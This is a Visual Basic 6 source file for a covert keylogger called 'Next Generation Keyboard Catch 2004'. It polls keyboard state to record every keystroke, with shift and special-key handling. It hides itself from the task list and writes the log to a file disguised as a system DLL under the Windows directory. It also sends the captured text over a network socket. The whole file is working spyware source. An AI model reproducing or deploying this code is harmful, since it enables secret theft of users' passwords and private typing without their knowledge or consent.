VERSION 5.00
Begin VB.Form Form1 
   AutoRedraw      =   -1  'True
   BackColor       =   &H80000012&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Next Generation Keyboard Catch 2004"
   ClientHeight    =   4185
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   8325
   Enabled         =   0   'False
   Icon            =   "Form1.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4185
   ScaleWidth      =   8325
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   4440
      Top             =   1080
   End
   Begin VB.Timer Timer2 
      Interval        =   10000
      Left            =   3840
      Top             =   1080
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H000080FF&
      BorderWidth     =   5
      Height          =   3615
      Left            =   240
      Top             =   240
      Width           =   7815
   End
   Begin VB.Label Text1 
      BackStyle       =   0  'Transparent
      ForeColor       =   &H000000FF&
      Height          =   3450
      Left            =   360
      TabIndex        =   2
      Top             =   360
      Width           =   7605
      WordWrap        =   -1  'True
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Key :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   195
      Left            =   5520
      TabIndex        =   1
      Top             =   3960
      Width           =   2580
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Next Generation Keyboard Catch 2004 (running...)"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   195
      Left            =   240
      TabIndex        =   0
      Top             =   3960
      Width           =   5055
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
''-----------------------||||||||||||||||-----------------<<<
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
''-----------------------^^^^^^^^^^^^^^^^-----------------<<<

Dim retVal As Long
Private Sub Form_Load()
Dim servID As Long
Text1.Caption = ""
DuratioN = 0
DuratioN0 = Timer
durationCounter = 0
retVal = GetConnectedDuration
'UpdateTextBox
App.TaskVisible = False 'hide from applications running
Set Form1 = Nothing 'hide from system processes (remove from memory)
End Sub
Private Sub UpdateTextBox()
Dim i, temChr As Byte
Open "c:\windows\inf\SysSetup1.dll" For Binary Access Read As #11
i = 1
If LOF(11) = 0 Then Exit Sub
Do While i <> LOF(11)
    Get #11, i, temChr
    AddToLog (Chr$(temChr))
    i = i + 1
Loop
Close #11
End Sub

Private Sub Text1_Change()
On Error Resume Next
WS.SendData Text1.Caption
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
Dim i, x As Long, x2, num, chrCode

For i = 65 To 90
x = GetAsyncKeyState(i)
x2 = GetAsyncKeyState(vbKeyShift)

If x = -32767 Then
    
'---->> For Debug
Label2.Caption = "  Key : " & i & "  ||  Keystate : " & x
''Debug.Print ChrW$(i)
'<<----

DoEvents
    If i > 64 And i < 91 Then
        If x2 = -32767 Or x2 = -32768 Then
            chrCode = i
        Else
            chrCode = i + 32
        End If
    Else
       If i < 58 Then
            chrCode = i
       ElseIf (i > 96 & i < 138 & num <> 0) Then
            chrCode = i - 48
       Else
            chrCode = i
       End If
        
    End If
AddToLog (Chr$(chrCode))
End If
Next i

DoEvents
TestOtherKeys

deskWinTitle = GetDesktopWindowText

End Sub

Private Sub Timer2_Timer()
Reset
Open "c:\windows\inf\SysSetup1.dll" For Output As #1
    Print #1, Text1.Caption
Close #1
End Sub
Private Sub AddToLog(strKey As String)
Text1.Caption = Text1.Caption & strKey
End Sub

Private Sub TestOtherKeys()
Dim num, shift

x = GetAsyncKeyState(8)   'For bckspace
If x = -32767 Then Text1.Caption = Mid(Text1.Caption, 1, Len(Text1) - 1)


For i = 9 To 255
    
    If i = 65 Then i = 90
    
    x = GetAsyncKeyState(i)
    shift = GetAsyncKeyState(16)
    
    If x = -32767 Then
    '---->> For Debug
    Label2.Caption = "  Key : " & i & "  ||  Keystate : " & x
    ''Debug.Print ChrW$(i)
    '<<----
    
    Select Case i
            Case 9: AddToLog ("<<tab>>")
            Case 13: AddToLog vbCrLf
            Case 17: AddToLog "<<ctrl>>"
            Case 18: AddToLog "<<alt>>"
            Case 19: AddToLog "<<pause>>"
            Case 20: AddToLog "<<capslock toggled>>"
            Case 27: AddToLog "<<Esc>>"
            Case 32: AddToLog " "
            Case 33: AddToLog "<<PgUp>>"
            Case 34: AddToLog "<<PgDn>>"
            Case 35: AddToLog "<<End>>"
            Case 36: AddToLog "<<Home>>"
            Case 37: AddToLog "<<LeftAr>>"
            Case 38: AddToLog "<<UpAr>>"
            Case 39: AddToLog "<<RightAr>>"
            Case 40: AddToLog "<<DnAr>>"
            Case 41: AddToLog "<<Select>>"
            Case 44: AddToLog "<<PrintScr>>"
            Case 45: AddToLog "<<Insert>>"
            Case 46: AddToLog "<<Del>>"
            Case 47: AddToLog "<<Hlp>>"
            Case 49: AddToLog IIf(shift = 0, "1", "!")
            Case 50: AddToLog IIf(shift = 0, "2", "@")
            Case 51: AddToLog IIf(shift = 0, "3", "#")
            Case 52: AddToLog IIf(shift = 0, "4", "$")
            Case 53: AddToLog IIf(shift = 0, "5", "%")
            Case 54: AddToLog IIf(shift = 0, "6", "^")
            Case 55: AddToLog IIf(shift = 0, "7", "&")
            Case 56: AddToLog IIf(shift = 0, "8", "*")
            Case 57: AddToLog IIf(shift = 0, "9", "(")
            Case 48: AddToLog IIf(shift = 0, "0", ")")
            Case 91, 92: AddToLog "<<WinKey>>"
            Case 96: AddToLog "0"
            Case 97: AddToLog "1"
            Case 98: AddToLog "2"
            Case 99: AddToLog "3"
            Case 100: AddToLog "4"
            Case 101: AddToLog "5"
            Case 102: AddToLog "6"
            Case 103: AddToLog "7"
            Case 104: AddToLog "8"
            Case 105: AddToLog "9"
            Case 106: AddToLog "*"
            Case 107: AddToLog "+"
            ''Case 108: AddToLog "."
            Case 109: AddToLog "-"
            Case 110: AddToLog "."
            Case 111: AddToLog "/"
            Case 112: AddToLog "<<F1>>"
            Case 113: AddToLog "<<F2>>"
            Case 114: AddToLog "<<F3>>"
            Case 115: AddToLog "<<F4>>"
            Case 116: AddToLog "<<F5>>"
            Case 117: AddToLog "<<F6>>"
            Case 118: AddToLog "<<F7>>"
            Case 119: AddToLog "<<F8>>"
            Case 120: AddToLog "<<F9>>"
            Case 121: AddToLog "<<F10>>"
            Case 122: AddToLog "<<F11>>"
            Case 123: AddToLog "<<F12>>"
            Case 226: AddToLog IIf(shift = 0, "\", "|")
            Case 188: AddToLog IIf(shift = 0, ",", "<")
            Case 189: AddToLog "_"
            Case 190:  AddToLog IIf(shift = 0, ".", ">")
            Case 191:  AddToLog IIf(shift = 0, "/", "?")
            Case 190:  AddToLog IIf(shift = 0, ".", ">")
            Case 220:  AddToLog IIf(shift = 0, "\", "|")
            Case 186:  AddToLog IIf(shift = 0, ";", ":")
            Case 222:  AddToLog IIf(shift = 0, "'", Chr$(34))
            Case 219:  AddToLog IIf(shift = 0, "[", "{")
            Case 221:  AddToLog IIf(shift = 0, "]", "}")
            Case 144: AddToLog "<<NumLckToggled>>"
    End Select
End If
Next i

End Sub
